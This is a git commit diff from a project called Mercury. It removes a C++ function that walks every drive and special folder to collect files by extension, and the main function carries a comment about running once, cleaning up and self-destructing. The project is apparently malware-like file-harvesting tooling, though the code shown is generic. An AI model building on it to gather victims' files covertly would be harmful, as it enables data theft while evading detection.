a34501eb78f7a3da2879f928d8612a27f218f675
0xConstant <noroh4xy@protonmail.com>
2023-10-13 09:46:55 -0700

    modified file a bit more and now compilation is working with addition of names.hpp

--- Mercury/main.cpp
+++ Mercury/main.cpp
@@ -7,28 +7,6 @@
 #include "Core/file_search.hpp"
 
 
-
-std::map<std::string, std::map<std::string, std::string>> FileEnum() {
-    std::vector<std::wstring> DIR_PATHS;
-    std::map<std::string, std::map<std::string, std::string>> FILE_PATHS;
-
-    std::vector<std::wstring> drives = Disk_ID();
-    std::vector<std::wstring> specialDirs = GetSpecialPaths();
-    DIR_PATHS.insert(DIR_PATHS.end(), drives.begin(), drives.end());
-    DIR_PATHS.insert(DIR_PATHS.end(), specialDirs.begin(), specialDirs.end());
-
-    for (const auto& PATH : DIR_PATHS) {
-        std::map<std::string, std::map<std::string, std::string>> tempResults;
-        tempResults = FileSearcher(PATH, FILE_EXTS);
-
-        // Append tempResults to FILE_PATHS
-        FILE_PATHS.insert(tempResults.begin(), tempResults.end());
-    }
-
-    return FILE_PATHS;
-}
-
-
 int main() {
 
     // Mode 1: run once and then > cleanup > self destruct
